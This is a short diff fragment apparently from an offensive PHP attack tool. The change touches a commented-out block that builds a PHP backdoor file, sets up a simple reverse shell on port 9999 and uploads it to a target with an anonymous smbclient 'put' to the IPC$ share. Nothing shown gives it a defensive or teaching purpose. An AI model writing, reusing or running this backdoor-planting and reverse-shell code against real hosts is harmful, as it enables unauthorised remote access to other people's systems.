@@ -1101,7 +1101,7 @@ system.
         
         
         /*
-         $backdoor_php = new FILE("$this->dir_tmp/backdoor_php.php");
+         $backdoor_php = new FILE($this->stream,"$this->dir_tmp/backdoor_php.php");
          $backdoor_php->backdoor_com_php_simple_reverse($this->prof, 9999);
          $this->req_ret_str("smbclient //$this->ip/IPC$ -N -U -t 1 -c \"put $backdoor_php->file_path \" ");
          */
